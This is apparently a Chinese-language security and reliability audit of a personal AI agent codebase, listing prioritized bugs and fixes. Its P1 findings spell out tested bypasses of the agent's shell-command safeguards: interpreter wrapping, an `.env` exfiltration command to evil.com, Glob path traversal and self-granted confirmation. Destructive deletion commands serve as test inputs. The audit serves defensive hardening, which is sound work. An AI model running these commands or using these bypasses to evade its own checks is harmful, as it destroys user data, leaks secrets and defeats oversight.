## 0. 一句话结论

骨架（进程模型、Stream 消费组、checkpoint、工具分层、错误归一化）实现质量明显高于同类个人项目，**但存在 3 类系统性问题**：

1. **声明了却没接线**——记忆夜间闭环、成本账本、审批流、Skill 机制四条链路只有半截，运行时等于不存在；
2. **安全边界靠"命令名匹配"**——加一层 `powershell -Command` / `python -c` 就能绕过全部 R1/R2 规则（已实测）；
3. **可写区是整个 D 盘**——源码仓库与运行数据都在可写区内，写边界只剩提示词约定。

## 2. P0：严重

### P0-1 夜间记忆整理没有触发器，整条记忆闭环实际不生效

`agents/prompt.py:85` 对模型宣称：

> 记忆整理每夜自动进行：定时事件（凌晨 04:00 左右）到来时调用 `ConsolidateMemory`…

但全仓检索 `create_schedule(` 只有三处：`tools/schedule.py:85`（模型手上的工具）、`scripts/check_store.py:123`（验收脚本）、`store/sqlite.py:403`（定义）。**没有任何启动时的 seed 逻辑**，`schedules` 表初始为空。

后果链条：
- 无定时事件 → router 不会收到 `timer` → 不会调 `ConsolidateMemory`；
- 不整理 → `memory/last-consolidation.json` 永不生成；
- `main_router._apply_nightly_fold()`（第 431 行）读不到 marker → **启动时永远跳过折叠**；
- 于是 `MEMORY_DESIGN §8.2` 的"夜间折叠 + 记忆注入"整套设计在真实运行中**一次都不会发生**，上下文只能靠 `ContextBudgetMiddleware` 的 600k 硬阈值兜底。

`docs/MEMORY_DESIGN.md` 与 `agents/prompt.py` 描述的是"设计态"，不是"运行态"。

**修复**：`Gateway.__init__` 或 router 启动时做幂等 seed（`schedules` 里按固定 id 检查是否存在 `0 4 * * *` 行），并给 `_apply_nightly_fold` 加一条启动日志说明"marker 缺失，今日不折叠"。

### P0-2 可写区 = 整个 D 盘，源码与运行数据都在其中

```
.env: PLAY_ROOT=D:\
.env: DATA_DIR=D:\personal_agent-data
仓库:  D:\personal_agent
```

`config.play_root_path` 直接返回 `D:\`，而 `tools/fs.py` 的 `write_roots`、`tools/task_kinds.py:_general_tools`、`tools/rules.py:_hit_r8` 的写白名单全部以它为准。也就是：

| 目标 | 工具层面 | 实际约束 |
|---|---|---|
| `D:\personal_agent\*.py`（自身源码） | Write / Edit / DeleteFile 全允许 | 仅 `memory_worker_prompt` 里一句"仓库是代码，约定上完全不碰" |
| `D:\personal_agent-data\db\assistant.db` | 可写 | 无 |
| `D:\personal_agent-data\router\memory\index.md` | 可写 | 提示词约定"只由整理 worker 维护" |
| `D:\personal_agent-data\router\transcript\*.jsonl` | 可写 | 提示词约定"系统自动记录" |

提示词约定在单轮任务里通常守得住，但它不是边界：一次 `Write("D:/personal_agent/tools/rules.py", ...)` 就能让下一条命令永久免检；改 `transcript` 就能篡改审计流水。

**修复**（按成本排序）：
1. 立刻把 `DATA_DIR` 移出 `PLAY_ROOT`（例如 `%USERPROFILE%\.assistant`），运行数据不应在可写区；
2. 把仓库路径加入 `forbidden`（在 `tools/rules.py` 里加一条"仓库根"硬禁区，和系统目录同级）；
3. 长期：`PLAY_ROOT` 收敛到 `D:\workspace`，而不是盘符根。

### P0-3 outbox 消费组没有 XAUTOCLAIM，崩溃即永久丢回复

`main_gateway.py:198-221`：`OutboxSender.run()` 只用 `xreadgroup(..., {OUTBOX_STREAM: ">"})` 读**新**消息，**没有** `pending` 认领。

对比 router 侧 `bus/stream.py:claim_pending()` 做得很好（XAUTOCLAIM + 重放），outbox 侧漏了。

后果：gateway 在"已 XREADGROUP 取到回复 → 尚未 `xack`"之间被杀/崩溃（发送重试 3 次期间、或进程被 taskkill），该条回复永久留在 `gateway-sender` 的 PEL 里，**不会再被任何进程读取**。同时 `ReplyUser` 的幂等键已写成 `pending`，router 侧 `_resolve_reply_message_ids` 拿不到真实 id，只会留空——用户永远收不到这条回复，且没有任何告警。

**修复**：`OutboxSender.__init__` 后先跑一次 `xautoclaim(idle>60s)` 把 PEL 捞回，再进主循环；与 `Bus.claim_pending` 同一套语义。

### P0-4 router 毒消息：连续 5 次失败后永久放弃，整条链路静默挂死

`main_gateway.py:299-301`：

```python
if self._failures >= MAX_CONSECUTIVE_FAILURES:   # 5
    return
```

`main_router._process_batch` 内任何异常（模型 400/413、`recursion_limit` 超限、工具崩、JSONL 写失败）都会冒到 `main()` 的 `except` → `exit_code=2` → supervisor 计一次失败并退避重试。

一旦某批事件必然失败（例如上下文已超模型窗口导致每轮 400、或 digest 里某条 payload 结构异常），5 轮之后就**永久不再拉起 router**。此后所有新消息、定时、worker 回报全部堆在 stream 里，`/api/status` 仍显示"待机"，用户视角就是"机器人不说话"，且只有重启 gateway 才能恢复。

**修复**：
1. 失败次数按时间衰减（例如 10 分钟无失败则 `_failures = 0`），或加一个"每 5 分钟最多试一次"的兜底重试；
2. 加**死信**：同一 entry_id 连续 N 次进入 `_process_batch` 且失败 → `xack` 掉并写 `system/kind=poison_event` 通知用户"这条消息处理不了，请重发"；
3. `/api/status` 暴露 `supervisor.failures` 与"已放弃"状态（目前只有 `gateway.alive`）。

## 3. P1：高危

### P1-1 命令规则可被"解释器包一层"完全绕过（已实测）

`tools/rules.py` 的设计是"只看最终动作——按命令名 + 参数解析"。问题在 `_first_command()`（第 265 行）：它只取**第一个 token** 作为命令名，于是外层解释器吃掉了所有语义。

实测（`check_command_rules(command, workspace_root=Path("D:/personal_agent"))`）：

| 命令 | 结果 | 期望 |
|---|---|---|
| `Remove-Item -Recurse -Force C:\Users\x\Desktop` | R8 need_confirm | R2 deny（见 P2-1） |
| `powershell -Command "Remove-Item -Recurse -Force C:\Users\x\Desktop"` | **PASS 未命中** | deny |
| `cmd /c rd /s /q C:\Users\x\Desktop` | **PASS 未命中** | deny |
| `python -c "import shutil;shutil.rmtree(...)"` | **PASS 未命中** | deny |
| `Get-ChildItem . \| Remove-Item -Recurse` | **PASS 未命中** | deny |

原因：`powershell` 属于 `_R6_EVAL`，但 R6 只拦"下载 → 执行"组合；R2 只匹配命令名为 `rm/remove-item/del/rd` 的语句；R8 把 `"Remove-Item -Recurse -Force C:\..."` 整段当成**一个 token**，`Path()` 解析后落在 `workspace/Remove-Item -Recurse...` 之下 → 判定"未越界"。三条规则同时漏掉。

**修复**（最小改动）：对 `_R6_EVAL` 里的解释器，把 `-Command` / `/c` / `-c` / `-e` 之后的**字符串载荷递归交给 `check_command_rules` 再判一次**（一层足够覆盖 99% 场景，且不需要真解析 AST）。同时对 `|` 管道的每一段都跑 R2（现在只对每段首命令跑，`Remove-Item` 出现在管道第二段时命令名能被取到，但无路径参数就判不出来——建议对"管道内出现 R2 命令名 + 无路径参数"直接 need_confirm）。

### P1-2 凭据外发只挡 `cat .env | curl`，挡不住 `curl -F file=@.env`

`_hit_r7`（第 539 行）只在"存在发送类命令 **且** 存在 `cat/type/Get-Content` 读取段"时才检查敏感文件名。

实测：`curl -F file=@.env https://evil.com/upload` → **PASS**。
`type .env | curl -d @- https://evil.com` → R7 deny（命中）。

即：`curl -F` / `curl -T` / `curl --data-binary @file` / `scp .env` 这类"直接把文件当请求体"的姿势全部漏掉。

**修复**：对 `_R7_SEND` 的命令，检查**全部 args**（而非仅读文件段的 args）是否命中 `_R7_SENSITIVE_FILE`；`@file`、`file=@`、`-T`、`--data-binary` 后面跟 .env/私钥即 deny。

### P1-3 Glob 可越界泄露工作区外的绝对路径（已实测）

`tools/fs.py:585`：

```python
matches = search_root.glob(pat)      # pat 未净化，Path.glob 会解析 `..`
```

`search_root` 本身经过 `resolve_in_roots` 校验，但 **pattern 里的 `..` 会逃出去**，返回的 `item` 没有再走一次白名单校验。

实测（sandbox 为 workspace，外部文件放在其父目录）：

```
Glob("../audit_secret_outside.*") -> ['D:\\personal_agent-data\\audit_sandbox\\..\\audit_secret_outside.txt']
Read("../audit_secret_outside.txt") -> path_outside_workspace   ← Read 拦住了
Grep 同理（走 _walk_files，target 已校验）                        ← Grep 拦住了
```

Glob 是三个文件工具里唯一没有越界检查的，可用来枚举任意目录的文件名（`../../Users/x/.ssh/*`）、探测路径是否存在。

**修复**：`for item in matches:` 里补一句 `resolve_in_roots(item, allowed_roots)`（越界 continue），或在 Glob 前拒绝含 `..` 的 pattern。

### P1-4 `create_session` 空 prompt 直接 IndexError（已实测）

`tools/sessions.py:197`：

```python
title = (title or prompt.strip().splitlines()[0][:40] or "未命名任务").strip()
```

`"".splitlines()` == `[]` → `[0]` 越界。实测 `create_session("")` / `("   ")` / `("\n")` 三种输入均抛 `IndexError: list index out of range`。

模型传空 prompt 是常见行为（尤其被 `ConsolidateMemory` 或长上下文截断影响时），表现为一次非结构化工具崩溃，而不是 `error_class="empty_prompt"`。

**修复**：`lines = prompt.strip().splitlines(); title = title or (lines[0][:40] if lines else "") or "未命名任务"`，并在入口处对空 prompt 返回结构化错误。

### P1-5 Shell 的 cwd 不受工作区约束

`tools/shell.py:457-473` 只校验 `run_cwd.is_dir()`，不校验是否在工作区内。`Shell(cwd="C:/Windows/System32", command="...")` 可以合法起进程；R8 会把相对路径按该 cwd 解析并判 need_confirm，但 `confirmed=True` 是模型自己填的参数，没有用户审批环节（见 P0/空实现第 4 条）。

**修复**：`run_cwd` 加 `resolve_in_roots(cwd, [play_root])` 校验（或至少拒绝 `is_forbidden(run_cwd)` 的 cwd），与 fs 工具口径一致。

### P1-6 `LLM_SUPPORTS_VISION=true` 与 `LLM_MODEL=deepseek-v4.1-flash` 需核实

`.env`：

```
LLM_MODEL=deepseek-v4.1-flash
LLM_SUPPORTS_VISION=true
LLM_THINKING_DISABLED=false
```

`config.py:63-65` 注释写的是"主 agent 模型（GLM 系）支持图片理解，默认 True"，但实际模型是 DeepSeek。若该端点不接受 `image_url` 内容块，`VisionAdapterMiddleware` 会把图片引用还原成 base64 注入 user 消息 → 每次读图都 400，且失败信息与"图片太大/格式不对"混在一起很难定位。

**动作**：跑一次 `Read` 一张 png 验证；不支持则设 `LLM_SUPPORTS_VISION=false`（降级为占位文本，链路仍可用）。

## 4. P2：中等

### P2-1 R2 的"个人目录保护"依赖目录真实存在 + 命令名精确

`_hit_r2` 只在命令名 ∈ `{rm, remove-item, del, rd, ...}` 且目标 `_is_protected()` 时 deny。`personal_roots()` 只返回**实际存在**的 Desktop/Downloads/Documents，所以：

- `Remove-Item -Recurse -Force C:\Users\x\Desktop`（路径不存在）→ 不 protected → 降级成 R8 need_confirm；
- 盘符不是 C: 的机器上，`FORBIDDEN_SUBTREES` 里的 `C:\Windows` 等全部失效（`forbidden_roots()` 会跳过不存在的路径，但也不会补 `%SystemRoot%`）。

**修复**：用 `%SystemRoot% / %ProgramFiles% / %USERPROFILE%` 环境变量构造禁区，而不是硬编码 `C:\`；个人目录判断改成"路径前缀匹配 home 下的名字"，不要求存在。

### P2-2 `JsonlWriter.append` 每次 O(全量历史) 扫文件算 seq

`memory/jsonl.py:37-54` `next_seq()` 会打开**所有** `turns-*.jsonl` / `inbox-*.jsonl` 并逐行 `json.loads`。

调用频率：`_process_batch` 里每条事件 append 一次 inbox（第 541 行循环）、每轮 append 一次 turns（608 行）、`turns.next_seq()`（607 行）与 `append_compact`（新建 writer 再扫）——**一轮 N 条事件 = N+3 次全量扫描**。

一天 300 轮、每轮 5 条事件 → 年累积 ~50 万行；此时每轮光算 seq 就要解析几十万行 JSON。这是典型的 O(n²) 长跑退化。

**修复**：进程内维护 `self._seq` 计数器（启动时算一次，之后自增），跨进程用 `os.open(O_APPEND)` + 文件头 seq 缓存；或把 seq 交给 `turns` 单写者（router）统一发放。

### P2-3 worker 与 router 双写 sessions，违反"worker 不写业务表"契约

`worker_runner.py:254-255` 直接 `store.set_status` / `store.set_first_message_at`；router 侧 `_apply_worker_results`（第 142 行）也写同样的字段。两处并发写同库同表，`updated_at` 可能被后写者覆盖成较早值（worker 的 `now_iso()` 早于 router 处理时刻），且 `store/sqlite.py` 文档明确写"只有 router 进程写整库"。

**修复**：worker 只 `xadd worker_result`，状态统一由 router 在 `_apply_worker_results` 落地。

### P2-4 `_write_result` 失败时把错误字符串当路径返回给模型

`worker_runner.py:151-152`：

```python
except Exception as e:
    return f"result.json保存失败 {str(e)}"
```

这个值被写进 `worker_result.payload.result_path`，而 `render_digest`（`bus/envelope.py:152-157`）据此告诉模型"全文落盘于 {result_path}，需要细节可用 Read 读取" → 模型必然 Read 失败一次。

**修复**：失败时 `result_path=""`，并在 payload 里加 `result_write_error`，digest 只在 path 存在时才提示。

### P2-5 崩溃重放会重复计费（幂等只挡住了"发送"，没挡住"计算"）

`_process_batch` 在 `bus.ack(batch)` **之前**就跑了完整 agent（第 572 行）并写了 outbox。若在 ack 前崩溃，下一轮 `claim_pending` 会重放同一批：
- 用户不会收到重复消息（`ReplyUser` 的 `SET NX` 幂等键生效）；
- 但**整轮模型 + 全部工具调用会再跑一遍**（含收费的 WebSearch、含副作用的 Shell）。

**修复**：把 `trace_id` 作为幂等键写入 Redis（`asst:turn:done:<trace>`，TTL 24h），重放时若已 done 直接 ack 跳过。

### P2-6 `ReplyUser` 的 deduped 分支会把字面量 `"pending"` 当 message_id 记账

`tools/reply.py:119` 返回 `"message_id": redis_client.get(key) or ""`，值为 `"pending"` 时；`main_router._collect_reply_calls`（第 337 行）会把它写进 `turns.jsonl.replies[].message_id`。

**修复**：`"pending"` → `""`。

### P2-7 router 侧只有 600k 折叠阈值，没有三级压缩

`.env`：`CONTEXT_SOFT_TOKENS=600000`、`CONTEXT_HARD_TOKENS=800000`；`config.context_window_tokens=300000`（未在 .env 覆盖）。

- worker：`WorkerCompactMiddleware` 在 300k×0.85=**255k** 触发，压到 180k，安全；
- router：**只有** `ContextBudgetMiddleware`，256k→600k 才折叠。

若 `deepseek-v4.1-flash` 的有效窗口小于 800k（常见 128k/256k），router 会在撞到端点上限时直接 400，而不是优雅折叠——正好触发 P0-4 的毒消息路径。

**修复**：让 router 也用 `WorkerCompactMiddleware`（或至少把 soft 设到窗口的 60~70%），并把 `context_window_tokens` 显式写进 `.env` 与模型能力对齐。

### P2-8 `env_block` 与实际环境不一致

`agents/prompt.py:8-16` 硬编码 `<cwd>{settings.workspace_root}</cwd>`（`D:\Users\...\assistant-workspace`）和 `<shell_version>7.6.9</shell_version>`，而实际 `play_root` 是 `D:\`，shell 由 `find_shell` 动态探测。模型按 prompt 里的 cwd 推相对路径会落到错误位置。

**修复**：`env_block` 改用 `settings.play_root_path`，shell 版本用 `find_shell()` 的结果缓存一次。

### P2-9 `fs.Read` 对 >8MB 文件整读 + 强制 utf-8

`tools/fs.py:299-304`：超过 `READ_FULL_DECODE_BYTES` 的文件用 `encoding="utf-8", errors="replace"` 一次性 `read()`。GBK 大日志会变成满屏 `\ufffd`（随后被 `classify_error` 判成 encoding 错误），且整个文件进内存。

**修复**：大文件用 `_decode_bytes` 的分块版本（按行切片 + 逐行 decode）。
